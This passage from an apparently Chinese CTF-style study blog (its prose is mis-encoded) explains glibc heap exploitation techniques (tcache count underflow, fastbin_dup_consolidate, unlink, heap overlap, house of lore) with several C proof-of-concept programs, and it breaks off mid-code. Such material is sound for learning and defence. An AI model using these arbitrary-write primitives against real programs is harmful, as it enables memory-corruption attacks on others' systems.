class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><h4 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence "tcache_perthread_struct").  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> counts[TCACHE_MAX_BINS]; </span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="meta-keyword">define</span> TCACHE_MAX_BINS                64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><ul><li><code>tcache_prethread_struct</code> æ˜¯æ•´ä¸ª tcache çš„ç®¡ç†ç»“æ„ï¼Œå…¶ä¸­æœ‰ 64 é¡¹ entriesã€‚æ¯ä¸ª entries ç®¡ç†äº†è‹¥å¹²ä¸ªå¤§å°ç›¸åŒçš„ chunkï¼Œç”¨å•å‘é“¾è¡¨ (<code>tcache_entry</code>) çš„æ–¹å¼è¿æ¥é‡Šæ”¾çš„ chunkï¼Œè¿™ä¸€ç‚¹ä¸Šå’Œ fastbin å¾ˆåƒ</li><li>æ¯ä¸ª thread éƒ½ä¼šç»´æŠ¤ä¸€ä¸ª <code>tcache_prethread_struct</code></li><li><code>tcache_prethread_struct</code> ä¸­çš„ <code>counts</code> è®°å½• <code>entries</code> ä¸­æ¯ä¸€æ¡é“¾ä¸Š chunk çš„æ•°ç›®ï¼Œæ¯æ¡é“¾ä¸Šæœ€å¤šå¯ä»¥æœ‰ 7 ä¸ª chunk</li><li><code>tcache_entry</code>ç”¨äºé“¾æ¥ chunk ç»“æ„ä½“ï¼Œå…¶ä¸­çš„<code>next</code>æŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªå¤§å°ç›¸åŒçš„ chunk<ul><li>è¿™é‡Œä¸ fastbin ä¸åŒçš„æ˜¯ fastbin çš„ fd æŒ‡å‘ chunk å¼€å¤´çš„åœ°å€ï¼Œè€Œ tcache çš„ next æŒ‡å‘ user data çš„åœ°æ–¹ï¼Œå³ chunk header ä¹‹å</li></ul></li></ul><p>é—®é¢˜å‘¢ï¼Œå°±åœ¨<code>tcache_entry</code>è¿™é‡Œï¼Œä¼—æ‰€å‘¨çŸ¥ï¼Œæˆ‘ä»¬è¿›è¡Œå¸¸è§„çš„tcache duping + tcache poisoningæ“ä½œæ—¶ï¼Œä¼šå¯¹åŒä¸€ä¸ªchunk freeä¸¤æ¬¡ï¼Œå¹¶mallocç›¸åŒå¤§å°çš„chunk ä¸‰æ¬¡ï¼Œä»¥æ­¤è¾¾åˆ°ä»»æ„åœ°å€å†™çš„ç›®çš„ã€‚</p><p>é‚£ä¹ˆæœ‰æ²¡æœ‰æƒ³è¿‡ï¼Œä½ freeä¸¤æ¬¡ï¼Œentries[]é‡Œé¢åªè®°å½•äº†ä¸¤æ¬¡ï¼Œä¹Ÿå°±æ˜¯entries[2]ï¼Œä½ mallocä¸€æ¬¡ï¼Œentries[]ä¸­çš„æ•°å­—å°±-1ï¼Œé‚£ä¹ˆä½ ç¬¬ä¸‰æ¬¡mallocçš„æ—¶å€™ï¼Œentries[]å°±å˜æˆäº†entries[-1]ï¼Œå¯èƒ½å¾ˆå¤šäººçœ‹åˆ°è¿™ä¸ª-1å°±æ˜ç™½è¿‡æ¥äº†ã€‚</p><p>æ˜¯çš„ï¼Œè¿™ä¸ªsizeçš„tcache binè¢«ä½ æº¢å‡ºäº†ã€‚é‚£ä¹ˆä¸‹æ¬¡ï¼Œä½ å†æ¬¡free ç›¸åŒsizeçš„chunkæ—¶ï¼Œtcache binä¸­è¿™ä¸ªsizeå¤§å°çš„entries[]å°±ä¼šè®¤ä¸ºæœ¬binå·²ç»è¢«å¡«æ»¡ï¼Œchunkå°±ä¼šæ ¹æ®sizeè½å…¥fastbinæˆ–è€…unsortedbinã€‚</p><p>æ­¤æ—¶ï¼Œæ ¹æ®uafæ¼æ´ï¼Œå°±å¯ä»¥showå‡ºmain_arenaã€‚(å¦‚æœå…è®¸mallocçš„sizeå°äº0x80ï¼Œé‚£ä¹ˆå°±æ‹¿ä¸åˆ°main_arena)</p><p>æ‰‹æ³•äºŒ:</p><p>å½“ç„¶ï¼Œå¦‚æœmallocçš„sizeå°äº0x80ï¼Œä¹Ÿæ˜¯åŸºäºuafæ¼æ´çš„è¯ï¼Œè¿˜æœ‰å¦å¤–ä¸€ç§æ–¹æ³•ã€‚</p><p>åœ¨double freeåï¼Œå› ä¸ºæ˜¯å•é“¾è¡¨ç»“æ„ï¼Œbinä¸­chunkçš„fdä¼šå‚¨å­˜ä¸‹ä¸€ä¸ªchunkçš„ä½ç½®ä¿¡æ¯ï¼Œdouble freeï¼Œä¹Ÿå°±æ˜¯æŠŠè‡ªå·±çš„åœ°å€å†™å…¥äº†fdã€‚å¦‚æœå­˜åœ¨uafï¼Œè‡ªç„¶å¯ä»¥åœ¨double freeåï¼Œç›´æ¥showæœ¬å †å—ï¼Œæ³„éœ²åœ°å€ã€‚è¿™æ ·ï¼Œé€šè¿‡uafæ¼æ´å®ç°ä»»æ„åœ°å€å†™ï¼Œè®²å †å—çš„sizeä½è¿›è¡Œä¿®æ”¹ï¼Œæ”¹æˆå¤§äº0x400ï¼Œfreeåè½å…¥unsortedbinï¼Œä»è€Œæ³„éœ²main_arenaã€‚</p><h2 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h2><h3 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h3><p>åœ¨åˆ©ç”¨ç”³è¯·ä¸€æ¬¡largebinå¤§å°çš„å †ä¼šå°†fastbinçš„å †è¿›è¡Œåˆå¹¶è¿›å…¥unsortedbinä¸­ï¼Œè¿™ç§æ‰“æ³•æ®æˆ‘æ‰€çŸ¥ï¼Œä¸€èˆ¬é…åˆscanfæ¥è¾¾æˆ(å› ä¸ºæ†¨æ†¨ä¹Ÿåªè§è¿‡é…åˆscanfçš„)</p><p>åˆ©ç”¨è¿™ç§ç‰¹æ€§ï¼Œå¯ä»¥è¾¾æˆfastbinçš„doublefree</p><p>è¿™é‡Œæ˜¯poc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"><span class="keyword">int</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"><span class="built_in">free</span>(p1);</span><br><span class="line">read(<span class="number">0</span>,buf,<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">read(<span class="number">0</span>,buf,<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">free</span>(p1);</span><br><span class="line">read(<span class="number">0</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å¤§åé¼é¼unlink"><a href="#å¤§åé¼é¼unlink" class="headerlink" title="å¤§åé¼é¼unlink"></a>å¤§åé¼é¼unlink</h2><p>ç½‘ä¸Šæœ‰å¾ˆå¤šæ•™ç¨‹ï¼Œæˆ‘ä¹Ÿå°±ç®€ç•¥ç‚¹ä¸€ç‚¹è‡ªå·±åœ¨å­¦ä¹ unlinkæ—¶é‡åˆ°çš„å›°éš¾</p><p>å…ˆè¯´åˆ©ç”¨å‰æï¼Œå­˜åœ¨æº¢å‡ºæ¼æ´</p><p>unlinkå®ç°æ‰‹æ®µ:</p><p>å‰å‘åˆå¹¶ï¼Œåœ¨chunk1ç§fake chunkï¼Œfake chunkçš„fd å’Œbkåˆ†åˆ«è®¾ç½®ä¸ºptr-0x18å’Œptr-0x10(64ä½)</p><p>32ä½æ˜¯ptr - 12 ,ptr-8</p><p>ä¿®æ”¹chunk2 headçš„prev_sizeä¸ºfake chunk sizeä»¥åŠchunk2 çš„prev_inuseä½ ç½®0,free chunk2</p><p>è¿™æ ·ï¼Œæœ€ç»ˆç»“æœï¼Œptrå°±æŒ‡å‘ptr-0x18çš„åœ°æ–¹ã€‚</p><p>æ­¤æ—¶ï¼Œæˆ‘ä»¬å°±è¾¾æˆäº†æˆ‘ä»¬æ‰€æƒ³è¦çš„ä»»æ„åœ°å€å†™ï¼Œæ€ä¹ˆç†è§£å‘¢ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * target = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">init();</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr1 = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr2 = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr3 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">target = ptr1;</span><br><span class="line">ptr1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">ptr1[<span class="number">1</span>] = <span class="number">0x81</span>;</span><br><span class="line">ptr1[<span class="number">2</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;target) - <span class="number">0x18</span>;</span><br><span class="line">ptr1[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;target) - <span class="number">0x10</span>;</span><br><span class="line">ptr2[<span class="number">-2</span>] = <span class="number">0x80</span>;</span><br><span class="line">ptr2[<span class="number">-1</span>] = <span class="number">0x90</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"target = %p before free\n"</span>,target);</span><br><span class="line"><span class="built_in">free</span>(ptr2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"target = %p after free\n"</span>,target);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"pid = %d\n"</span>,getpid());</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="number">0x80e010</span> before <span class="built_in">free</span>  <span class="comment">//è¿™é‡Œæ˜¯è¿è¡Œç»“æœ</span></span><br><span class="line">target = <span class="number">0x601078</span> after <span class="built_in">free</span></span><br><span class="line">pid = <span class="number">49521</span></span><br></pre></td></tr></table></figure><p>ptrè¿™ä¸ªæŒ‡é’ˆåŸæœ¬æŒ‡å‘çš„æ˜¯å †å—çš„åœ°å€ï¼Œä½†æ˜¯ç»è¿‡æˆ‘ä»¬çš„unlinkä¹‹åï¼ŒptræŒ‡é’ˆå°±æŒ‡å‘äº†è‡ªèº«åœ°å€-0x18çš„åœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯ä¸Šè¿°æ‰€è¡¨ç¤ºçš„ptr=ptr-0x18ã€‚</p><p>é‚£ä¹ˆï¼Œæˆ‘ä»¬å°±è·å¾—äº†ä¸¤ä¸ªç›¸åŒçš„æŒ‡é’ˆã€‚ä¸€ä¸ªæŒ‡é’ˆå­˜åœ¨äºåŸæœ¬çš„ptråœ°å€é‡Œï¼Œå¦ä¸€ä¸ªå°±æ˜¯æˆ‘ä»¬ç°åœ¨æ§åˆ¶çš„chunkæŒ‡é’ˆã€‚</p><p>æ­¤æ—¶ï¼Œæˆ‘ä»¬ä¿®æ”¹fake_chunk[3]ä¸ºè¦å†™çš„åœ°å€(ä¹Ÿå°±æ˜¯ä¸Šé¢æ‰€è§çš„chunk0[3]) ï¼Œå› ä¸ºfake_chunk[3]æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œæˆ‘ä»¬å°†å…¶è¿›è¡Œä¿®æ”¹ï¼ŒæŒ‡å‘æ–°åœ°å€å°±ä»£è¡¨ç€æˆ‘ä»¬å°†æ–°åœ°å€çš„å†…å®¹ä½œä¸ºäº†æˆ‘ä»¬fake_chunkçš„å†…å®¹ï¼Œæ­¤æ—¶å†ä¿®æ”¹fake_chunk[0] (ä¹Ÿå°±æ˜¯ä¿®æ”¹æˆ‘ä»¬æ–°åœ°å€çš„å†…å®¹) å³è¾¾æˆäº†ä¸€æ¬¡ä»»æ„åœ°å€å†™~</p><p>åå‘åˆå¹¶</p><p>æ­¤æ—¶æ£€æŸ¥chunk1çš„ä¸‹ä¸‹ä¸ªchunkçš„flagä½ï¼Œé‚£ä¹ˆæ­¤æ—¶å°±åœ¨chunk2 faka chunkï¼Œå¹¶ä¸”å°†chunk3çš„prev_inuseä½ ç½®0ï¼Œ</p><h2 id="å †é‡å "><a href="#å †é‡å " class="headerlink" title="å †é‡å "></a>å †é‡å </h2><p>å †é‡å ï¼Œé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯ä¸¤ä¸ªå †æŒ‡é’ˆåŒæ—¶æŒ‡å‘åŒä¸€ä¸ªchunkã€‚è¿™é‡Œå€ŸåŠ©ä¸€ä¸‹unlinkæ“ä½œå®ç°ã€‚</p><p>poc:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * target = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">init();</span><br><span class="line"><span class="keyword">int</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr2 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr4 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">target = ptr1;</span><br><span class="line"><span class="built_in">free</span>(ptr1);</span><br><span class="line"><span class="built_in">free</span>(ptr2);</span><br><span class="line"><span class="built_in">free</span>(ptr3);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr5 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr6 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr7 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">free</span>(ptr5);</span><br><span class="line">ptr7[<span class="number">-1</span>] = <span class="number">0x110</span>;</span><br><span class="line"><span class="built_in">free</span>(ptr7);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * ptr8 = <span class="built_in">malloc</span>(<span class="number">0x320</span>);</span><br><span class="line">read(<span class="number">0</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œï¼Œptr6æŒ‡é’ˆå°±è¢«é¢„ç•™ã€‚</p><p>è¦æƒ³å®ç°éœ€è¦è¾¾æˆä¸¤ä¸ªæ¡ä»¶ï¼Œå‡è®¾æœ‰chunk1,2,3ã€‚</p><p>ä¸€æ˜¯chunk3çš„prev_inuseä¸º0ï¼Œchunk3çš„prev_sizeä¸ºchunk1+chunk2</p><p>äºŒæ˜¯chunk2çš„prev_sizeä¸ºchunk1ã€‚</p><p>æ£€æµ‹æ˜¯è¿™æ ·çš„ï¼Œåœ¨free chunk3æ—¶æ ¹æ®prev_sizeä»¥ä¸ºå‰é¢æœ‰chunk1+chunk2å¤§å°çš„chunkï¼Œæ‰¾åˆ°chunk1ï¼Œæ‰¾åˆ°chunk2çš„prev_sizeï¼Œç¬¦åˆï¼Œunlinkã€‚</p><h2 id="House-of"><a href="#House-of" class="headerlink" title="House of"></a>House of</h2><h3 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore"></a>house of lore</h3><p>ç®€è¿°ä¸€ä¸‹ï¼Œè¿™ä¸ªå°±æ˜¯åˆ©ç”¨small binæ¥è¾¾æˆä»»æ„åœ°å€å†™ã€‚å¦‚æœæ ˆåœ°å€å¯å†™ï¼Œé‚£å°±å¯ç”¨æ¥æ‰“æ ˆï¼Œæ§åˆ¶è¿”å›æµç¨‹è¿›è€Œæ§åˆ¶ç¨‹åºã€‚</p><p>å…ˆæ¥è¯´è¯´å‰ç½®çŸ¥è¯†ï¼Œæ£€æµ‹å’Œä¸ºä»€ä¹ˆfreeåè½å…¥unsorted binï¼Œçœ‹ä¸åˆ°small biné‡Œçš„æ•°æ®ã€‚</p><p>æ£€æµ‹:</p><p><img src="https://gitee.com/zhzzhz/blog_warehouse/raw/master/img/image-20200505233038696.png" alt></p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å–small binæœ€åä¸€ä¸ªchunkçš„æ—¶å€™ä¼šè¿›è¡Œæ£€æµ‹ï¼Œå¦‚æœå­˜åœ¨ç©ºé—²å †å—ï¼Œå°±ä¼šè¿›è¡Œæ£€æµ‹ã€‚</p><p>æ£€æµ‹ä¸ºè·å–æœ€åä¸€ä¸ªå †å—çš„bk(ä¹Ÿå°±æ˜¯è·å–å€’æ•°ç¬¬äºŒä¸ªå †å—çš„åœ°å€)ï¼Œæ£€æŸ¥å€’æ•°ç¬¬äºŒä¸ªå †å—çš„fdæ˜¯å¦ä¸ºæœ€åä¸€ä¸ªå †å—ã€‚</p><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ç§æ£€æµ‹ï¼Œä¿®æ”¹æœ€åä¸€ä¸ªchunkçš„bkæŒ‡å‘æˆ‘ä»¬æƒ³è¦çš„åœ°å€ï¼ˆfake_chunkçš„headéƒ¨ï¼Œä¸æ˜¯memï¼‰</p><p>åœ¨é‚£ä¸ªåœ°å€æ„é€ å¥½fake_chunkï¼Œprev_sizeï¼Œsizeå¯ä»¥ç›´æ¥å†™0ï¼Œæ— å¯¹è¿™ä¿©çš„æ£€æµ‹ã€‚åªéœ€è¦æ„é€ fdå’Œbkï¼Œ</p><p>fdä¸ºæœ€åä¸€ä¸ªå †å—åœ°å€ï¼Œbkä¸ºfake_chunk2</p><p>ï¼ˆæ³¨æ„ä¸€ç‚¹ï¼Œåœ¨æ‰“fake_chunkåœ°å€çš„æ—¶å€™ï¼Œä¼šå†è¿›è¡Œä¸€æ¬¡ä¸Šè¿°æ£€æµ‹ï¼Œæ‰€ä»¥è¦åœ¨fake_chunkåé¢å†æ„é€ ä¸€ä¸ªfake_chunk2ï¼Œè¿™ä¸ªfake_chunk2ä¸ç”¨æ„é€ prev_size,sizeä»€ä¹ˆçš„ï¼Œåªéœ€è¦æ³¨æ„åœ¨fdä½ç½®å†™ä¸Šfake_chunkåœ°å€å°±å¥½ï¼‰</p><p>è¯´å®Œæ£€æµ‹ï¼Œæ¥è¯´è¯´ç¬¬äºŒä¸ªé—®é¢˜ã€‚</p><p>ä¸çŸ¥é“ä½ ä»¬æœ‰æ²¡æœ‰ï¼Œåæ­£æˆ‘å­¦è‰ºä¸ç²¾ï¼Œåœ¨å­¦è¿™ä¸ªçš„æ—¶å€™ï¼Œæƒ³çš„æ˜¯ï¼Œæˆ‘å†™çš„pocæ€ä¹ˆsizeæ˜¯åœ¨smallbinèŒƒå›´ï¼Œfreeåå…¨åœ¨unsortedbinï¼Œè¿›ä¸åˆ°smallbiné‡Œã€‚</p><p>æ­¤æ—¶æ¥äº†è§£ä¸€ä¸‹ï¼Œunsorted bin å¯ä»¥è§†ä¸ºç©ºé—² chunk å›å½’å…¶æ‰€å± bin ä¹‹å‰çš„ç¼“å†²åŒº</p><p>åœ¨freeäº†small binå¤§å°çš„å †å—åï¼Œå †å—ä¼šè¢«æ”¾å…¥åˆ° unsort bin ä¸­å»ï¼Œç„¶åä¸‹ä¸€æ¬¡åˆ†é…çš„å¤§å°å¦‚æœæ¯”å®ƒå¤§ï¼Œé‚£ä¹ˆå°†ä» top chunk ä¸Šåˆ†é…ç›¸åº”å¤§å°ï¼Œè€Œè¯¥ chunk ä¼šè¢«å–ä¸‹ link åˆ°ç›¸åº”çš„ bin ä¸­ã€‚å¦‚æœæ¯”å®ƒå° (ç›¸ç­‰åˆ™ç›´æ¥è¿”å›)ï¼Œåˆ™ä»è¯¥ chunk ä¸Šåˆ‡é™¤ç›¸åº”å¤§å°ï¼Œå¹¶è¿”å›ç›¸åº” chunkï¼Œå‰©ä¸‹çš„æˆä¸º last reminder chunk , è¿˜æ˜¯å­˜åœ¨ unsorted bin ä¸­ã€‚</p><p>okï¼Œå‰ç½®è®²å®Œäº†ï¼Œæ€»ç»“æ‰“æ³•ï¼Œåœ¨ç›®æ ‡åœ°å€ä¼ªé€ ä¿©chunk,chunk1çš„fdæŒ‡åˆ°smallbinçš„æœ€åä¸€ä¸ªchunkï¼ŒbkæŒ‡å‘chunk2ï¼Œchunk2çš„fdæŒ‡å‘chunk1ã€‚smallbinçš„æœ€åä¸€ä¸ªchunkçš„bkæŒ‡å‘chunk1ï¼Œå‰©ä¸‹å°±æ˜¯mallocå®Œäº‹ã€‚ä¸Šå›¾ï¼</p><p><img src="https://gitee.com/zhzzhz/blog_warehouse/raw/master/img/image-20200506000743726.png" alt></p><p>è´´pocï¼ŒğŸ‘´ä»¬è‡ªå·±çœ‹8ï¼Œåº”è¯¥æ²¡ä»€ä¹ˆè¦è®²çš„äº†ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> * target = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">setbuf(<span class="built_in">stdin</span>,<span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>,<span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">init();</span><br><span class="line"><span class="keyword">int</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">intptr_t</span>* stack_buffer_1[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">intptr_t</span>* stack_buffer_2[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">intptr_t</span> *victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="keyword">intptr_t</span> *victim_chunk = victim<span class="number">-2</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_buffer_1 at %p\n"</span>, (<span class="keyword">void</span>*)stack_buffer_1);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_buffer_2 at %p\n"</span>, (<span class="keyword">void</span>*)stack_buffer_2);</span><br><span class="line"><span 